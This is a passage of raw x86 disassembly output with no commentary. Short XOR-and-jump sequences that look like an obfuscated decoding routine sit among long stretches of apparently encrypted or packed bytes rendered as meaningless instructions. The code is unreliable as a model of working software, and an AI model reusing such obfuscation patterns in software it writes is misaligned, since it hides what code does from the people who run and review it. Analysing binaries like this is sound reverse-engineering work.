  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	inc    esi
  407b34:	rol    BYTE PTR [edx+0x2],cl
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b93
  407b40:	lods   al,BYTE PTR ds:[esi]
  407b41:	pop    ebp
  407b42:	dec    edx
  407b43:	cmp    ebx,esp
  407b45:	icebp  
  407b46:	test   al,0xa1
  407b48:	cs pop esp
  407b4a:	pop    esp
  407b4b:	xchg   BYTE PTR [ebp-0x3f],dh
  407b4e:	or     eax,0xa8ca58e0
  407b53:	mov    edx,0xb90b8411
  407b58:	dec    ebp
  407b59:	jge    0x407b7a
  407b5b:	sbb    DWORD PTR [eax+0x4842cea4],ecx
  407b61:	mov    eax,ds:0xe15d41cc
  407b66:	mov    al,ds:0x5bf68807
  407b6b:	test   DWORD PTR [eax+0x7f],esp
  407b6e:	add    ah,BYTE PTR [esi-0x2b]
  407b71:	lods   al,BYTE PTR ds:[esi]
  407b72:	fwait
  407b73:	pop    esp
  407b74:	cmp    BYTE PTR [ebx-0x62251be],dl
  407b7a:	fcomp  st(0)
  407b7c:	cdq    
  407b7d:	cmp    BYTE PTR [edi*1+0xafad53d],0x1
  407b85:	mov    ah,0xe3
  407b87:	xchg   esi,eax
  407b88:	fwait
  407b89:	int    0x61
  407b8b:	mov    BYTE PTR [edi+esi*2+0x28d868f1],dh
  407b92:	jo     0x407b30
  407b94:	mov    ecx,0x5c1a87cb
  407b99:	pushf  
  407b9a:	cmp    edi,edx
  407b9c:	test   ecx,edx
  407b9e:	test   al,0x2
  407ba0:	inc    eax
  407ba1:	fld    TBYTE PTR [ebx-0x67]
  407ba4:	adc    dh,BYTE PTR [edx+0x79]
  407ba7:	stos   BYTE PTR es:[edi],al
  407ba8:	add    BYTE PTR [edx],ah
  407baa:	rcl    ch,1
  407bac:	or     al,0xe4
  407bae:	fisub  WORD PTR [esi]
  407bb0:	sbb    al,dh
  407bb2:	stos   BYTE PTR es:[edi],al
  407bb3:	dec    edi
  407bb4:	ss stc 
  407bb6:	push   esi
  407bb7:	jmp    0xbb093b0d
  407bbc:	sahf   
  407bbd:	inc    esi
  407bbe:	inc    ebp
  407bbf:	mov    WORD PTR [esi-0x11649c07],ss
  407bc5:	xchg   ebx,eax
  407bc6:	jg     0x407b54
  407bc8:	shr    BYTE PTR [ebx+0xd69a557],0xee
  407bcf:	(bad)  
  407bd1:	add    al,BYTE PTR [edi-0x21]
  407bd4:	jno    0x407c03
  407bd6:	dec    edi
  407bd7:	pop    edx
  407bd8:	je     0x407bbb
  407bda:	mov    al,0x15
  407bdc:	std    
  407bdd:	gs xchg ebx,eax
  407bdf:	inc    esi
  407be0:	pop    ecx
  407be1:	sub    al,0x3f
  407be3:	sbb    BYTE PTR [ebx-0x66],ch
  407be6:	out    0x80,al
  407be8:	or     al,0xea
  407bea:	sub    DWORD PTR [ebx-0x4c5936df],edi
  407bf0:	repnz imul edi,DWORD PTR [ecx-0x276bcf75],0x3a
  407bf8:	(bad)  
  407bf9:	into   
  407bfa:	popa   
  407bfb:	jbe    0x407bc9
  407bfd:	mov    bl,0xf0
  407bff:	jmp    0xf0dc:0x62c61c1c
  407c06:	sbb    esi,0x1342d4d0
  407c0c:	ins    DWORD PTR es:[edi],dx
  407c0d:	mov    esi,0xa69a6849
  407c12:	jmp    0xdc054efa
  407c17:	loop   0x407b99
  407c19:	mov    eax,DWORD PTR [edi-0x12]
  407c1c:	in     al,0xa3
  407c1e:	jae    0x407c7d
  407c20:	dec    esi
  407c21:	jmp    0x407bd1
  407c23:	push   ecx
  407c24:	adc    cl,dl
  407c26:	pusha  
  407c27:	cmp    BYTE PTR [esi+0x6c],0x3
  407c2b:	mov    bh,0xb8
  407c2d:	mov    ds:0x71677b0a,al
  407c32:	scas   eax,DWORD PTR es:[edi]
  407c33:	lods   al,BYTE PTR ds:[esi]
  407c34:	loop   0x407bc4
  407c36:	and    bl,ah
  407c38:	jbe    0x407c7d
  407c3a:	(bad)  
  407c3b:	retf   0x6d5d
  407c3e:	sub    BYTE PTR [esi+0x15d86df1],ah
  407c44:	cmp    edi,ebx
  407c46:	bound  ebp,QWORD PTR [ecx+0x2d7a067f]
  407c4c:	push   ebx
  407c4e:	stos   BYTE PTR es:[edi],al
  407c4f:	xchg   edi,eax
  407c50:	mov    eax,0x5030c808
  407c55:	inc    ecx
  407c56:	es jo  0x407c40
  407c59:	rcr    cl,1
  407c5b:	jmp    0xd009:0xdb31747c
  407c62:	sbb    bh,BYTE PTR [edi+0x48aa85be]
  407c68:	mov    dh,dh
  407c6a:	(bad)  
  407c6b:	inc    eax
  407c6c:	add    ebp,DWORD PTR [eax]
  407c6e:	lock sub BYTE PTR [ebx],0x86
  407c72:	mov    esi,0xc84c0305
  407c77:	leave  
  407c78:	jne    0x407ce9
  407c7a:	ret    
  407c7b:	aam    0x15
  407c7d:	popa   
  407c7e:	out    0x7b,eax
  407c80:	cmp    eax,0xbc0b3fdd
  407c85:	pop    edx
  407c86:	jno    0x407c53
  407c88:	mov    ecx,0xcf9cedcc
  407c8d:	inc    eax
  407c8e:	(bad)  [ebx-0x6aab9aca]
  407c94:	push   ecx
  407c95:	fsub   st,st(0)
  407c97:	pop    esi
  407c98:	fisttp WORD PTR [edx-0x14]
  407c9b:	mov    dh,0x22
  407c9d:	bound  ecx,QWORD PTR [ecx]
  407c9f:	int3   
  407ca0:	sbb    al,0x40
  407ca2:	jb     0x407c2a
  407ca4:	sub    dh,BYTE PTR [ecx]
  407ca6:	sbb    BYTE PTR [eax-0xd],dl
  407ca9:	inc    ebx
  407caa:	mov    bh,0x63
  407cac:	call   0x2c8dc17d
  407cb1:	sbb    BYTE PTR [ecx+0x79349f32],dl
  407cb7:	mov    ebp,0xad180663
  407cbc:	lods   eax,DWORD PTR ds:[esi]
  407cbd:	ror    BYTE PTR [ecx+eax*2+0x3d506dd0],cl
  407cc4:	and    esi,DWORD PTR [edx+eax*1+0x54642f27]
  407ccb:	mov    ah,BYTE PTR [ebx+edx*2+0x669b1e47]
  407cd2:	daa    
  407cd3:	mov    DWORD PTR [eax],esi
  407cd5:	fisubr WORD PTR [eax+0x41]
  407cd8:	je     0x407cbd
  407cda:	xlat   BYTE PTR ds:[ebx]
  407cdb:	and    DWORD PTR [eax-0x1edb859f],edi
  407ce1:	test   ah,0x40
  407ce4:	sbb    BYTE PTR [esi],0xf6
  407ce7:	cs push es
  407ce9:	fwait
  407cea:	xchg   esp,eax
  407ceb:	xchg   edx,eax
  407cec:	mov    ds:0xc6cdc3bd,eax
  407cf1:	inc    ecx
  407cf2:	in     al,0x87
  407cf4:	mov    bl,0xea
  407cf6:	cld    
  407cf7:	ret    
  407cf8:	push   esp
  407cf9:	mov    ecx,0xdcb119f
  407cfe:	js     0x407c82
  407d00:	mov    edi,0x37b20c5d
  407d05:	add    cl,BYTE PTR [ebp-0x5879c480]
  407d0b:	cmp    BYTE PTR [eax+0x25327c4b],dl
  407d11:	lds    esi,FWORD PTR [ebp-0x3f]
  407d14:	ror    DWORD PTR [edi+0x9],cl
  407d17:	shl    BYTE PTR [esi],0xea
  407d1a:	les    esp,FWORD PTR [esi+0x2685f654]
  407d20:	dec    esp
  407d21:	xchg   ecx,eax
  407d22:	stc    
  407d23:	sub    al,0x42
  407d25:	jmp    0xa3ee:0x6b067d2
  407d2c:	cli    
  407d2d:	outs   dx,BYTE PTR ds:[esi]
  407d2e:	retf   
  407d2f:	aas    
  407d30:	out    dx,eax
  407d31:	adc    BYTE PTR [eax],ch
  407d33:	dec    esi
  407d34:	add    eax,0x6a8dc72d
  407d39:	lods   eax,DWORD PTR ds:[esi]
  407d3a:	(bad)  
  407d3c:	pop    eax
  407d3d:	rcr    eax,1
  407d3f:	sbb    al,BYTE PTR ds:0xdda9c4aa
  407d45:	inc    ebx
  407d46:	fld    TBYTE PTR ds:0x31778eba
  407d4c:	pop    ebx
  407d4d:	pop    ds
  407d4e:	and    al,0xcf
  407d50:	gs add ecx,esi
  407d53:	push   ebx
  407d54:	dec    ebx
  407d55:	inc    eax
  407d56:	jmp    0x407d6e
  407d58:	(bad)  
  407d59:	out    dx,al
  407d5a:	cmp    ecx,DWORD PTR [ecx]
  407d5c:	in     al,dx
  407d5d:	push   0xf49d8049
  407d62:	xor    ecx,ecx
  407d64:	cli    
  407d65:	arpl   WORD PTR [esi-0x2423d929],sp
  407d6b:	push   esp
  407d6c:	(bad)  
  407d6d:	fdivr  DWORD PTR [esi]
  407d6f:	xchg   esi,eax
  407d70:	mov    eax,0x8e63a90e
  407d75:	imul   eax,DWORD PTR [eax],0xffffffea
  407d78:	xor    esp,esp
  407d7a:	mov    BYTE PTR [edx-0x1e],ch
  407d7d:	inc    ebx
  407d7e:	add    BYTE PTR [ebx+0x24d7bd2d],bl
  407d84:	fisubr DWORD PTR [edx-0x25d8b5c1]
  407d8a:	ss sub eax,0x65221f47
  407d90:	imul   ebp,edi,0xfffffff5
  407d93:	and    cl,0x5f
  407d96:	or     BYTE PTR [ebx],ah
  407d98:	(bad)  
  407d99:	in     eax,0x12
  407d9b:	sti    
  407d9c:	(bad)  
  407d9d:	mov    bh,0xea
  407d9f:	jno    0x407d69
  407da1:	push   0x5cdb3087
  407da6:	xor    al,0x6a
  407da8:	arpl   WORD PTR [ecx+edi*8+0x3a],sp
  407dac:	pushf  
  407dad:	aas    
  407dae:	adc    bh,cl
  407db0:	leave  
  407db1:	mov    BYTE PTR [edi-0x51ec9e13],ah
  407db7:	pop    ebx
  407db8:	add    DWORD PTR [ebx-0x276ba723],0xffffffd6
  407dbf:	mov    ds:0x3924a1c6,eax
  407dc4:	jl     0x407e35
  407dc6:	loop   0x407d8d
  407dc8:	aad    0x4a
  407dca:	push   edx
  407dcb:	jmp    DWORD PTR [esi+0x4e5f4fcc]
  407dd1:	and    ebp,ebx
  407dd3:	in     eax,0xfd
  407dd5:	pop    ecx
  407dd6:	jl     0x407e45
  407dd8:	inc    edx
  407dd9:	sub    esp,DWORD PTR cs:[ebx-0x57fd06a6]
  407de0:	popa   
  407de1:	pop    es
  407de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407de3:	lahf   
  407de4:	xchg   ebp,eax
  407de5:	cwde   
  407de6:	mov    bh,0x42
  407de8:	lods   al,BYTE PTR ds:[esi]
  407de9:	fsubr  DWORD PTR [ecx+0x370da697]
  407def:	pushf  
  407df0:	jae    0x407d7e
  407df2:	push   ss
  407df3:	not    dl
  407df5:	in     al,0xb9
  407df7:	shl    DWORD PTR [ebp+0x60],cl
  407dfa:	cwde   
  407dfb:	xchg   DWORD PTR [ebp+0x67],edx
  407dfe:	jmp    0xd6be07b5
  407e03:	repnz mov dh,0x12
  407e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e07:	mov    WORD PTR [edi],gs
  407e09:	scas   eax,DWORD PTR es:[edi]
  407e0a:	pop    ebp
  407e0b:	loop   0x407e4c
  407e0d:	mov    WORD PTR [ecx+0x7b],cs
  407e10:	jae    0x407e04
  407e12:	lods   eax,DWORD PTR ds:[esi]
  407e13:	pop    ecx
  407e14:	(bad)  
  407e15:	loopne 0x407e81
  407e17:	sar    BYTE PTR [ecx-0x39],0xa2
  407e1b:	xor    edx,edi
  407e1d:	add    DWORD PTR [ebx-0x17],0x1c76d840
  407e24:	mov    ?,WORD PTR [edi+0x7a6cceb0]
  407e2a:	or     eax,0xe4a81277
  407e2f:	fcomp  QWORD PTR [ebx+esi*4]
  407e32:	inc    edx
  407e33:	pop    eax
  407e34:	arpl   WORD PTR [ebp+0x8c6318e],si
  407e3a:	and    eax,0x570aaf90
  407e3f:	test   BYTE PTR [edi+0x6],bl
  407e42:	xlat   BYTE PTR ds:[ebx]
  407e43:	push   ebx
  407e44:	fisubr WORD PTR [esi+edi*8-0x56146315]
  407e4b:	inc    edx
  407e4c:	fcom   DWORD PTR [ecx+0x2244fd37]
  407e52:	call   0xb1ae3568
  407e57:	fdivr  st(5),st
  407e59:	aam    0xe3
  407e5b:	test   eax,0x637240d0
  407e60:	push   edx
  407e61:	lods   eax,DWORD PTR ds:[esi]
  407e62:	xchg   DWORD PTR [edi],ebx
  407e64:	xchg   dh,ch
  407e66:	or     BYTE PTR [ebp-0x3fc25b21],ah
  407e6c:	inc    esi
  407e6d:	mov    edi,0x84d62b79
  407e72:	xchg   BYTE PTR [ecx+0x72],cl
  407e75:	fisubr DWORD PTR [esi]
  407e77:	ins    BYTE PTR es:[edi],dx
  407e78:	jno    0x407e4a
  407e7a:	and    edi,DWORD PTR [di-0x5d93]
  407e7f:	xchg   ecx,eax
  407e80:	jge    0x407f01
  407e82:	pop    esi
  407e83:	cdq    
  407e84:	xchg   DWORD PTR [edx-0x12],eax
  407e87:	ja     0x407e6f
  407e89:	lea    esi,[edi+0x3ff82b7b]
  407e8f:	dec    esi
  407e90:	add    DWORD PTR [eax-0x495b3b22],ecx
  407e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e97:	ret    
  407e98:	mov    dh,0x1d
  407e9a:	jae    0x407ed6
  407e9c:	arpl   WORD PTR [eax-0x30],bp
  407e9f:	xchg   BYTE PTR gs:[esi+0x8],ah
  407ea3:	push   ecx
  407ea4:	pop    edi
  407ea5:	xor    BYTE PTR [ebp-0x42],bh
  407ea8:	jg     0x407e55
  407eaa:	xchg   esp,eax
  407eab:	shr    BYTE PTR [esi-0x35],0x28
  407eaf:	test   DWORD PTR [ebx-0x4a7fe1e0],ecx
  407eb5:	jl     0x407e52
  407eb7:	aad    0x35
  407eb9:	ds xchg edx,eax
  407ebb:	fsubr  QWORD PTR [ebx+0x27]
  407ebe:	scas   eax,DWORD PTR es:[edi]
  407ebf:	shr    esi,0x57
  407ec2:	loope  0x407f09
  407ec4:	in     eax,0xf0
  407ec6:	add    esi,DWORD PTR [ebx+0x4fa9958a]
  407ecc:	mov    edi,0x79f3b97b
  407ed1:	lods   al,BYTE PTR ds:[esi]
  407ed2:	mov    ebp,0x2d53cfa2
  407ed7:	mov    bh,BYTE PTR [ecx]
  407ed9:	and    al,0xf8
  407edb:	xchg   BYTE PTR [eax+0x4d0a9a7d],bl
  407ee1:	pop    DWORD PTR [ecx+edx*1-0x4e]
  407ee5:	test   ecx,eax
  407ee7:	jl     0x407e6c
  407ee9:	dec    edx
  407eea:	stc    
  407eeb:	mov    edi,0xbd5b6f30
  407ef0:	push   edi
  407ef1:	shl    BYTE PTR [ecx],cl
  407ef3:	mov    ch,0x28
  407ef5:	jne    0x407ec2
  407ef7:	lock shr bl,0x1f
  407efb:	(bad)  
  407efc:	or     edi,DWORD PTR [ebx-0x6a]
  407eff:	call   0x1733:0x114a6684
  407f06:	cmp    DWORD PTR [ebx],edx
  407f08:	mov    ebx,0xc1f43e36
  407f0d:	inc    ebx
  407f0e:	outs   dx,DWORD PTR ds:[esi]
  407f0f:	xchg   edx,eax
  407f10:	cmp    ax,WORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f73
  407f78:	fwait
  407f79:	or     bl,BYTE PTR [edx-0x56]
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407f34
  407f84:	mov    esp,0x7cd416f2
  407f89:	repz cmc 
  407f8b:	and    BYTE PTR [ebp+0x54a2863],bh
  407f91:	cmp    al,ah
  407f93:	push   ds
  407f94:	std    
  407f95:	sub    BYTE PTR [edi+0x48],al
  407f98:	pushw  es
  407f9a:	sahf   
  407f9b:	cld    
  407f9c:	or     BYTE PTR [eax-0x6c],ah
  407f9f:	mov    dl,0xd3
  407fa1:	push   ebp
  407fa2:	xor    dl,cl
  407fa4:	cmp    ebx,DWORD PTR [edx]
  407fa6:	repnz mov edi,0x676971b
  407fac:	jmp    0x819b:0xeba86a33
  407fb3:	jmp    0x407ff8
  407fb5:	cmp    DWORD PTR [esi],0xffffffe8
  407fb8:	fld    QWORD PTR [esi-0x5a4d0801]
  407fbe:	fsub   QWORD PTR [edx-0x366d60da]
  407fc4:	mov    ch,0x1a
  407fc6:	adc    ecx,eax
  407fc8:	jl     0x407f91
  407fca:	rcr    BYTE PTR [ebx+0x4b],cl
  407fcd:	loop   0x407f7b
  407fcf:	adc    al,0x96
  407fd1:	and    edx,0x8deb70dc
  407fd7:	sbb    al,0x33
  407fd9:	cmp    al,0x69
  407fdb:	xor    bl,BYTE PTR [esi+edx*1-0x5d]
  407fdf:	ret    
  407fe0:	jmp    0x74c8c3e8
  407fe5:	bound  ebp,QWORD PTR [edi]
  407fe7:	in     eax,dx
  407fe8:	(bad)  
  407fe9:	daa    
  407fea:	in     eax,0xd7
  407fec:	dec    ebx
  407fed:	call   0x8c1e:0xfe50752a
  407ff4:	lds    ebp,FWORD PTR [edx+0x20]
  407ff7:	hlt    
  407ff8:	out    0xa9,al
  407ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ffb:	in     al,0x79
  407ffd:	pop    ss
  407ffe:	test   eax,0x163db60f
  408003:	mov    BYTE PTR [edx+0x61],bh
  408006:	sbb    al,0x8
  408008:	outs   dx,DWORD PTR ds:[esi]
  408009:	mov    al,ds:0x2520c42b
  40800e:	stos   BYTE PTR es:[edi],al
  40800f:	outs   dx,BYTE PTR ds:[esi]
  408010:	pop    ebx
  408011:	jmp    0x196e:0x546672e0
  408018:	xchg   esi,eax
  408019:	xchg   ecx,eax
  40801a:	push   0xa1e24c2f
  40801f:	scas   eax,DWORD PTR es:[edi]
  408020:	add    dh,BYTE PTR [edx+0x525cf222]
  408026:	sbb    BYTE PTR [edi],dl
  408028:	xchg   WORD PTR [ebp-0x66],dx
  40802c:	cmp    BYTE PTR [edx+esi*2+0x62],cl
  408030:	dec    esi
  408031:	in     al,dx
  408032:	mov    ebp,0x664814c1
  408037:	or     ebx,DWORD PTR [edx+ebp*4+0x2dd48017]
  40803e:	pop    es
  40803f:	rcr    bl,0xe3
  408042:	int    0x0
  408044:	xor    ch,ch
  408046:	in     al,0xdd
  408048:	fdivr  QWORD PTR [ecx-0x2d]
  40804b:	adc    edi,DWORD PTR [eax-0x7099474c]
  408051:	loope  0x407fd5
  408053:	mov    al,ds:0xa6120c1d
  408058:	jo     0x408065
  40805a:	fs popa 
  40805c:	retf   0x18d6
  40805f:	sub    eax,0xd2cea3f7
  408064:	in     al,0x35
  408066:	cmp    BYTE PTR ss:[ecx],dl
  408069:	sbb    edi,DWORD PTR [edx+0xb6c0aa2]
  40806f:	aad    0xb2
  408071:	sub    eax,0xd786005a
  408076:	inc    ecx
  408077:	and    dl,ah
  408079:	scas   eax,DWORD PTR es:[edi]
  40807a:	pop    esp
  40807b:	cmp    eax,0xdee52371
  408080:	sbb    dh,ch
  408082:	and    dl,BYTE PTR [eax-0x29]
  408085:	(bad)  [edi+0x5bcf5692]
  40808b:	jle    0x408044
  40808d:	jmp    0xf41d:0x43448139
  408094:	jo     0x4080ad
  408096:	out    0xc8,al
  408098:	sbb    al,0x8e
  40809a:	fst    DWORD PTR [edi]
  40809c:	scas   al,BYTE PTR es:[edi]
  40809d:	les    ebx,FWORD PTR [eax]
  40809f:	mov    ah,0x80
  4080a1:	pop    edi
  4080a2:	pop    ss
  4080a3:	sbb    bh,BYTE PTR [esi+0x290b64e9]
  4080a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080aa:	jae    0x4080eb
  4080ac:	xor    esi,DWORD PTR [ecx+0x6fa2073c]
  4080b2:	test   BYTE PTR [ecx],dl
  4080b4:	mov    esi,eax
  4080b6:	push   ebx
  4080b7:	je     0x408088
  4080b9:	mov    ebp,gs
  4080bb:	mov    bl,bh
  4080bd:	cld    
  4080be:	cmp    edx,DWORD PTR [ebp+0xf564802]
  4080c4:	test   eax,0xf714fd4d
  4080c9:	(bad)  [ecx]
  4080cb:	in     al,dx
  4080cc:	mov    cl,0xd6
  4080ce:	push   0x0
  4080d0:	or     BYTE PTR [esi-0x1939a27b],al
  4080d6:	inc    ebp
  4080d7:	por    mm1,QWORD PTR [ecx]
  4080da:	iret   
  4080db:	pop    ds
  4080dc:	addr16 push ecx
  4080de:	xlat   BYTE PTR ds:[ebx]
  4080df:	scas   al,BYTE PTR es:[edi]
  4080e0:	push   es
  4080e1:	lahf   
  4080e2:	sub    DWORD PTR [ecx+0x69],esi
  4080e5:	adc    eax,0xc933b8e0
  4080ea:	fsub   QWORD PTR ss:[edx-0x24]
  4080ee:	into   
  4080ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f0:	jno    0x4080a2
  4080f2:	add    eax,0x6c395a5e
  4080f7:	loop   0x4080a1
  4080f9:	and    eax,0x3d467ef2
  4080fe:	dec    eax
  4080ff:	std    
  408100:	in     eax,dx
  408101:	jo     0x408123
  408103:	cdq    
  408104:	xchg   esi,eax
  408105:	xlat   BYTE PTR ds:[ebx]
  408106:	add    ebx,esi
  408108:	or     bl,BYTE PTR [edx-0x136b9f73]
  40810e:	imul   esp
  408110:	adc    ebx,eax
  408112:	into   
  408113:	loopne 0x4080c3
  408115:	mov    ds,WORD PTR [esi]
  408117:	hlt    
  408118:	or     edx,0xffffffb0
  40811b:	retf   0x9418
  40811e:	(bad)  
  408120:	inc    edx
  408121:	adc    edi,DWORD PTR [ebx]
  408123:	ja     0x408101
  408125:	arpl   WORD PTR [edi+0x65],dx
  408128:	add    al,0xb
  40812a:	lods   al,BYTE PTR ds:[esi]
  40812b:	fild   DWORD PTR [ecx-0xcdc9640]
  408131:	mov    ah,0xe8
  408133:	pop    ebx
  408134:	and    dl,bh
  408136:	iret   
  408137:	pushf  
  408138:	xor    BYTE PTR [ebx+ecx*1+0x4c],ah
  40813c:	cwde   
  40813d:	sub    edx,DWORD PTR [ecx+0x0]
  408140:	pop    eax
  408141:	mov    DWORD PTR [ecx-0x49],edi
  408144:	inc    edx
  408145:	stc    
  408146:	jne    0x408106
  408148:	xchg   DWORD PTR [eax],esi
  40814a:	gs pusha 
  40814c:	or     DWORD PTR [esi-0x560366cb],edx
  408152:	pop    es
  408153:	pusha  
  408154:	cmp    eax,0x519067f0
  408159:	fisub  WORD PTR [edx-0x170260e]
  40815f:	(bad)  
  408160:	stc    
  408161:	or     bh,BYTE PTR [edi+edi*2-0x6fdb8da5]
  408168:	add    eax,edi
  40816a:	fsubr  QWORD PTR [ecx]
  40816c:	or     DWORD PTR [ebp+esi*1+0x42],esp
  408170:	sti    
  408171:	bound  edi,QWORD PTR [ebx-0x30]
  408174:	repnz xchg ebx,eax
  408176:	pop    ds
  408177:	(bad)  
  408178:	mov    dh,0xf3
  40817a:	jmp    0x408177
  40817c:	aaa    
  40817d:	add    esp,DWORD PTR [ebx-0x12e46958]
  408183:	adc    ebx,edx
  408185:	aas    
  408186:	lea    ebx,[ebp+0x2b]
  408189:	hlt    
  40818a:	xchg   esp,eax
  40818b:	ret    
  40818c:	es pop edx
  40818e:	fs push eax
  408190:	adc    eax,0x17b39b24
  408195:	mov    ?,WORD PTR [eax+0x295c62f1]
  40819b:	lods   al,BYTE PTR ds:[esi]
  40819c:	dec    ebx
  40819d:	rcl    BYTE PTR [ebx-0x25cb0f6f],1
  4081a3:	sahf   
  4081a4:	enter  0xf781,0xed
  4081a8:	inc    edi
  4081a9:	push   edi
  4081aa:	or     BYTE PTR [eax],al
  4081ac:	and    al,0x5f
  4081ae:	mov    dh,dh
  4081b0:	je     0x4081ce
  4081b2:	es iret 
  4081b4:	mov    esp,0x9c18151b
  4081b9:	jno    0x4081a4
  4081bb:	ror    BYTE PTR gs:[edx-0x3],0x9e
  4081c0:	test   eax,0x5cf83e51
  4081c5:	dec    esi
  4081c6:	aas    
  4081c7:	inc    esi
  4081c8:	popa   
  4081c9:	mov    dh,cl
  4081cb:	inc    edx
  4081cc:	xor    esp,edx
  4081ce:	jbe    0x4081f0
  4081d0:	mov    al,ds:0xec4323f4
  4081d5:	scas   eax,DWORD PTR es:[edi]
  4081d6:	pop    ecx
  4081d7:	fld    TBYTE PTR [ebp-0x64521fdd]
  4081dd:	inc    DWORD PTR [edi+0x2]
  4081e0:	mov    edx,0x22b813f2
  4081e5:	aaa    
  4081e6:	push   eax
  4081e7:	inc    ebp
  4081e8:	jne    0x408250
  4081ea:	push   ss
  4081eb:	mov    dh,0xd4
  4081ed:	jg     0x4081ce
  4081ef:	push   ecx
  4081f0:	pusha  
  4081f1:	fldenv [ecx+0x1b]
  4081f4:	arpl   WORD PTR [ecx+0x70068adf],si
  4081fa:	xchg   esp,eax
  4081fb:	(bad)  
  4081fc:	pop    esp
  4081fd:	sub    eax,0x3f45cea4
  408202:	hlt    
  408203:	xchg   esi,eax
  408204:	ja     0x4081dc
  408206:	(bad)  
  408207:	test   al,0xdc
  408209:	xor    al,0xbd
  40820b:	(bad)  
  40820d:	dec    edi
  40820e:	push   edi
  40820f:	jp     0x40820e
  408211:	mov    cl,0xdf
  408213:	xor    eax,0xd92aaea6
  408218:	mov    ?,WORD PTR [eax+ebx*8+0x7c]
  40821c:	scas   eax,DWORD PTR es:[edi]
  40821d:	cmp    esp,edx
  40821f:	enter  0x24b0,0x2
  408223:	fs mov dl,0x73
  408226:	icebp  
  408227:	lods   eax,DWORD PTR ds:[esi]
  408228:	scas   eax,DWORD PTR es:[edi]
  408229:	push   ebp
  40822a:	daa    
  40822b:	fs push edi
  40822d:	lock jmp 0x9979:0x97d7f93c
  408235:	mov    dl,0x27
  408237:	int3   
  408238:	cmp    dh,BYTE PTR [ecx]
  40823a:	test   esp,edi
  40823c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40823d:	cld    
  40823e:	addr16 nop
  408240:	(bad)  
  408242:	push   ecx
  408243:	pop    esi
  408244:	dec    esi
  408246:	sahf   
  408247:	xchg   edx,eax
  408248:	jne    0x408277
  40824a:	adc    esi,ecx
  40824c:	int    0xe2
  40824e:	shr    BYTE PTR [ebp-0x7c52c129],1
  408254:	push   esi
  408255:	retf   
  408256:	in     eax,dx
  408257:	cmp    DWORD PTR [ecx],ebx
  408259:	retf   
  40825a:	dec    eax
  40825b:	in     al,dx
  40825c:	aam    0xe2
  40825e:	jge    0x408259
  408260:	pop    esi
  408261:	test   al,0x1b
  408263:	into   
  408264:	pop    esi
  408265:	dec    ebp
  408266:	shl    DWORD PTR [ebp-0x3a5906bc],cl
  40826c:	add    al,0x18
  40826e:	inc    ebp
  40826f:	ss in  al,0x0
  408272:	fld    DWORD PTR [ecx-0x34]
  408275:	icebp  
  408276:	shl    ch,1
  408278:	test   eax,0xc3570fc6
  40827d:	xchg   DWORD PTR [edi+0x27406d61],ecx
  408283:	jns    0x4082bc
  408285:	aaa    
  408286:	sbb    BYTE PTR [esi-0x5e],ah
  408289:	add    bh,dh
  40828b:	lea    ebx,[bx+si]
  40828e:	aad    0x93
  408290:	and    esp,esp
  408292:	imul   edi,DWORD PTR [edi+0x709a0c01],0x3a1fc1d2
  40829c:	adc    DWORD PTR [esp+eiz*8+0x24072d7d],0x329eb6cf
  4082a7:	xlat   BYTE PTR ds:[ebx]
  4082a8:	out    dx,eax
  4082a9:	sub    BYTE PTR [edx],0xa4
  4082ac:	push   edi
  4082ad:	jecxz  0x40827c
  4082af:	pop    edi
  4082b0:	sbb    bl,BYTE PTR [eax]
  4082b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b3:	loopne 0x4082cc
  4082b5:	or     esi,DWORD PTR [edx]
  4082b7:	out    dx,al
  4082b8:	bound  ebp,QWORD PTR es:[eax+0x50589514]
  4082bf:	mov    BYTE PTR [edi],al
